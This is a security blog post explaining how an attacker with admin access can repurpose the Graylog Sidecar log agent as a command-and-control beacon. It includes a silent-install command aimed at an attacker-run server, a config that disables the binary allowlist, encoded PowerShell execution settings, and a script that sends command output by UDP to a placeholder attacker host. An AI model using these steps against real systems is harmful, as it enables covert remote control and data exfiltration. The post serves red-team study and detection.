@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Graylog Sidecar as a C2 Beacon | Anushan Lingam</title>
+<meta property="og:title" content="Graylog Sidecar as a C2 Beacon | Anushan Lingam" />
+<meta name="twitter:title" content="Graylog Sidecar as a C2 Beacon | Anushan Lingam" />
+<meta itemprop="name" content="Graylog Sidecar as a C2 Beacon | Anushan Lingam" />
+<meta name="application-name" content="Graylog Sidecar as a C2 Beacon | Anushan Lingam" />
+<meta property="og:site_name" content="Anushan Lingam" />
+
+<meta name="description" content="Mostly a collection of half baked security tools that just about get the job done and the occasional write up of interesting/newly seen malware samples.">
+<meta itemprop="description" content="Mostly a collection of half baked security tools that just about get the job done and the occasional write up of interesting/newly seen malware samples." />
+<meta property="og:description" content="Mostly a collection of half baked security tools that just about get the job done and the occasional write up of interesting/newly seen malware samples." />
+<meta name="twitter:description" content="Mostly a collection of half baked security tools that just about get the job done and the occasional write up of interesting/newly seen malware samples." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+
+
+  <meta itemprop="image" content="https://blog.anushanlingam.com/" />
+  <meta property="og:image" content="https://blog.anushanlingam.com/" />
+  <meta name="twitter:image" content="https://blog.anushanlingam.com/" />
+  <meta name="twitter:image:src" content="https://blog.anushanlingam.com/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-06-10T11:23:07&#43;0100 />
+    <meta property="article:published_time" content=2023-06-10T11:23:07&#43;0100 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Graylog Sidecar as a C2 Beacon",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-06-10",
+        "description": "",
+        "wordCount":  1185 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-06-10",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Anushan Lingam"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.111.3">
+
+    
+
+    <link rel="canonical" href="https://blog.anushanlingam.com/posts/20230610-graylogc2/">
+    <link href="/style.min.e8353c8bf6aa84457d3c7f65980d94548f249c91e6b37b15b9f1c7e13ceed431.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://blog.anushanlingam.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-JHF9Y18MLH"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-JHF9Y18MLH', { 'anonymize_ip': false });
+}
+</script>
+</head>
+<body data-theme = "dark" class="notransition">
+<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://blog.anushanlingam.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Graylog Sidecar as a C2 Beacon</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-06-10T11:23:07&#43;01:00" itemprop="datePublished"> 10 Jun 2023 </time>
+                </div>
+            </header>
+            <details class="toc">
+                <summary><b>Table of Contents</b></summary>
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#the-plan">The Plan</a></li>
+    <li><a href="#creating-the-demo-environment">Creating the Demo Environment</a>
+      <ul>
+        <li><a href="#spinning-up-a-graylog-instance">Spinning up a Graylog Instance</a></li>
+        <li><a href="#preparing-your-graylog-instance">Preparing Your Graylog Instance</a></li>
+        <li><a href="#installing-sidecar-agent">Installing Sidecar Agent</a></li>
+      </ul>
+    </li>
+    <li><a href="#executing-a-command">Executing a Command</a></li>
+    <li><a href="#streamlining-the-process">Streamlining the Process</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+            </details><div class="page-content">
+                <h2 id="introduction">Introduction</h2>
+<p>Imagine you&rsquo;ve successfully gained access to a host and have escalated to a local admin. Now, your objective is to establish a beacon for remote command execution. While there are numerous C2 frameworks available online for this purpose, let&rsquo;s make things interesting by abusing a legitimate tool instead.</p>
+<p>Graylog is an open-source log management solution. One component of this product is the &lsquo;Sidecar&rsquo; agent, which can be likened to Splunk&rsquo;s &lsquo;Universal Forwarder.&rsquo; Its primary purpose is to allow centralized configuration management for various log collectors directly from the Graylog platform. The Sidecar agent comes pre-packaged with commonly used collectors like Filebeat and Winlogbeat. However, it also provides the flexibility to define your own collector binaries and configuration files, enabling you to use alternative collectors like NXLog.</p>
+<p>While the default configuration of the Sidecar agent restricts the execution of unapproved binaries, once you have privileged access to the host, there are avenues to bypass these limitations. For instance, you could bring in your own copy of the Sidecar agent with an insecure configuration or modify the existing configuration to point the agent to a Graylog instance that we control and allow the execution of unauthorized binaries.</p>
+<p><strong>Default Configuration</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="c"># A list of binaries which are allowed to be executed by the Sidecar. An empty list disables the access list feature.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># Wildcards can be used, for a full pattern description see https://golang.org/pkg/path/filepath/#Match</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># Default:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># collector_binaries_accesslist:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#  - &#34;C:\\Program Files\\Graylog\\sidecar\\filebeat.exe&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#  - &#34;C:\\Program Files\\Graylog\\sidecar\\winlogbeat.exe&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#  - &#34;C:\\Program Files\\Filebeat\\filebeat.exe&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#  - &#34;C:\\Program Files\\Packetbeat\\packetbeat.exe&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#  - &#34;C:\\Program Files\\Metricbeat\\metricbeat.exe&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#  - &#34;C:\\Program Files\\Heartbeat\\heartbeat.exe&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#  - &#34;C:\\Program Files\\Auditbeat\\auditbeat.exe&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#  - &#34;C:\\Program Files (x86)\\nxlog\\nxlog.exe&#34;</span><span class="w">
+</span></span></span></code></pre></div><p><strong>Allowing unrestricted execution</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">collector_binaries_accessList</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
+</span></span></span></code></pre></div><h2 id="the-plan">The Plan</h2>
+<p>The Sidecar agent will periodically (10seconds by default) check in to the Graylog server. During each check-in, the agent compares the configuration file and collector definitions with the previous state. If any changes are detected, the updated configuration is retrieved from the Graylog server, and the relevant collector is restarted to apply the modifications. We&rsquo;ll define a collector that launches PowerShell with customizable arguments from our Graylog instance. The Sidecar agent will execute the command with powershell, and the output will be sent back to Graylog as a log message.</p>
+<p><img src="/20230610-GraylogSidecarC2/flow.png" alt="Command Flow"></p>
+<h2 id="creating-the-demo-environment">Creating the Demo Environment</h2>
+<h3 id="spinning-up-a-graylog-instance">Spinning up a Graylog Instance</h3>
+<p>You can find detailed instructions for installing Graylog in the <a href="%22https://go2docs.graylog.org/5-0/downloading_and_installing_graylog/installing_graylog.html%22">official documentation</a>. if you&rsquo;re looking for a quick demo, the Docker setup is a good option. You can obtain the docker-compose file for the latest build and set up an instance relatively quickly.</p>
+<h3 id="preparing-your-graylog-instance">Preparing Your Graylog Instance</h3>
+<p>Once you have Graylog up and running, there are a couple of things we need to setup. First, create a new UDP Syslog input to receive the output from the executed commands. Navigate to <em><strong>&lsquo;System -&gt; Inputs -&gt; Create New Input&rsquo;</strong></em> to do this. In this demo, a random port will be used. However, you have the option to set up a syslog server on a common port like 443, which can then forward the logs to your Graylog instance. This approach can help overcome outbound firewall blocks to arbitrary ports.</p>
+<p><img src="/20230610-GraylogSidecarC2/new_input.png" alt="New Syslog Input"></p>
+<p>Next, you want to create an API token that Sidecar uses to communicate with your instance. If you navigate to <em><strong>&lsquo;System -&gt; Users &amp; Teams&rsquo;</strong></em>, there is an built-in &lsquo;Sidecar Sytem User&rsquo; that has the necessary permissions. Hit <em><strong>&lsquo;Edit Token&rsquo;</strong></em> on this user and generate a new token.</p>
+<p><img src="/20230610-GraylogSidecarC2/token.png" alt="New API Token"></p>
+<h3 id="installing-sidecar-agent">Installing Sidecar Agent</h3>
+<p>On the host you want to control, you simply need to find a way to get the official <a href="%22https://github.com/Graylog2/collector-sidecar/releases%22">Sidecar installer</a> to run with silent install options to point it to your Graylog instance.</p>
+<pre tabindex="0"><code>graylog_sidecar_setup.exe /S -SERVERURL=http://your Graylog IP address or DNS name/api -APITOKEN=yourapitoken
+</code></pre><p>Finally, replace the default config file found alongside the &lsquo;graylog-sidecar.exe&rsquo; binary with the below contents in a file named &lsquo;sidecar.yml&rsquo;. If all goes well, you should see  a new device entry in the <em><strong>&lsquo;System -&gt; Sidecar&rsquo;</strong></em> page.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="c"># The URL to the Graylog server API.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># Default: &#34;http://127.0.0.1:9000/api/&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">server_url</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;http://&lt;YOUR_GRAYLOG_INSTANCE&gt;/api&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># The API token to use to authenticate against the Graylog server API.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># Default: none</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">server_api_token</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&lt;YOUR_API_TOKEN&gt;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">node_id</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;file:C:\\Program Files\\Graylog\\sidecar\\node-id&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">node_name</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">update_interval</span><span class="p">:</span><span class="w"> </span><span class="m">10</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">tls_skip_verify</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">send_status</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">collector_binaries_accesslist</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
+</span></span></span></code></pre></div><h2 id="executing-a-command">Executing a Command</h2>
+<p>For the demo, I will be using this simple powershell script that grabs the current user and then sends the result to input we configured earlier.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="kd">Function</span><span class="w"> </span><span class="nb">Send-GLMessage</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">Param</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">String</span><span class="p">]</span><span class="nv">$MSG</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nv">$UDPCLient</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">UdpClient</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$UDPCLient</span><span class="p">.</span><span class="py">Connect</span><span class="p">(</span><span class="s2">&#34;&lt;GL Instance URL&gt;&#34;</span><span class="p">,</span> <span class="p">&lt;</span><span class="n">SYSLOG</span> <span class="n">PORT</span><span class="p">&gt;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$Encoding</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$ByteSyslogMessage</span> <span class="p">=</span> <span class="nv">$Encoding</span><span class="p">.</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$MSG</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$UDPCLient</span><span class="p">.</span><span class="py">Send</span><span class="p">(</span><span class="nv">$ByteSyslogMessage</span><span class="p">,</span> <span class="nv">$ByteSyslogMessage</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$out</span> <span class="p">=</span> <span class="p">([</span><span class="no">Security.Principal.WindowsIdentity</span><span class="p">]::</span><span class="n">GetCurrent</span><span class="p">()).</span><span class="py">Name</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Send-GLMessage</span> <span class="nv">$out</span>
+</span></span></code></pre></div><p>In <em><strong>&lsquo;System -&gt; Sidecars -&gt; Configuration&rsquo;</strong></em>, create a new &lsquo;Log Collector&rsquo; with the below configuration options.</p>
+<ul>
+<li>Name: Name your collecter.</li>
+<li>Process Management: Foreground Execution</li>
+<li>Operating System: Windows</li>
+<li>Executable Path: Path the the binary you want to run, in this case this is the path to Powershell.exe</li>
+<li>Execute Parameters: The command line arguments you want to pass to your binary. In this case we will use &lsquo;-ExecutionPolicy Bypass -EncodedCommand &ldquo;BASE64_Command_Here&rdquo;</li>
+</ul>
+<p><strong>Example</strong></p>
+<img src="/20230610-GraylogSidecarC2/collector.png" height="500" width="500">
+<p>Next, on the same page, create a new configuration and select your new log collecter for the collector type. Then, switch to the &lsquo;Administration&rsquo; tab and assign the config to your sidecar agent. Within a couple seconds you should see a new message in Graylog with the output of your command. As you can see on the right-hand side, the powershell process is spawned as a child &lsquo;graylog-sidecar.exe&rsquo; and inherits its system permissions.</p>
+<p><img src="/20230610-GraylogSidecarC2/demo.gif" alt="New API Token"></p>
+<h2 id="streamlining-the-process">Streamlining the Process</h2>
+<p>Now that we have confirmed the ability to execute commands and receive results, let&rsquo;s streamline the process. We need to address a couple of peculiarities: firstly, the command executing multiple times due to Sidecar attempting to restart our &lsquo;collector,&rsquo; and secondly, the impracticality of manually updating settings in the GUI for each command we want to run.</p>
+<p>Below is a demo of a simple POC Python tool. It connects to a sidecar host within Graylog and provides a simulated PowerShell terminal. You can enter your command, which the Python script injects into a template PowerShell script. The template includes code for sending the response to the Graylog cluster and preventing multiple command executions. The injected script is then converted to base64, and the Graylog API is used to update the &lsquo;TEST&rsquo; collector, similar to our manual process earlier. The tool continuously polls the Graylog API for a message entry containing the response and displays it on the console.</p>
+<p>In the example below, the Python tool is displayed on the right, where I enter commands. On the left-hand side, you can see Graylog receiving the messages after Sidecar executes the command, followed shortly by the response appearing in my terminal window.</p>
+<p><img src="/20230610-GraylogSidecarC2/GraylogC2PY.gif" alt="GraylogC2.py"></p>
+<h2 id="summary">Summary</h2>
+<p>The viability of this approach is questionable, especially in the example provided where you are simply executing standard PowerShell commands. While you might succeed in deploying the tool initially because it is a legitimate binary, any competent EDR will raise alarms when it detects &ldquo;suspicious&rdquo; commands being executed and other processes being spawned. However, with the Sidecar agent, you have the flexibility to specify any binary, so there is nothing stopping you from remotely invoking and passing arguments to the various tools out there that can execute commands in a stealthier manner.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+<a href="https://github.com/anushanlingam" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 Cyber Security Blog.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
+        theme on
+        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+    
+    
+    <script src="https://blog.anushanlingam.com/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
+
+</body>
+</html>
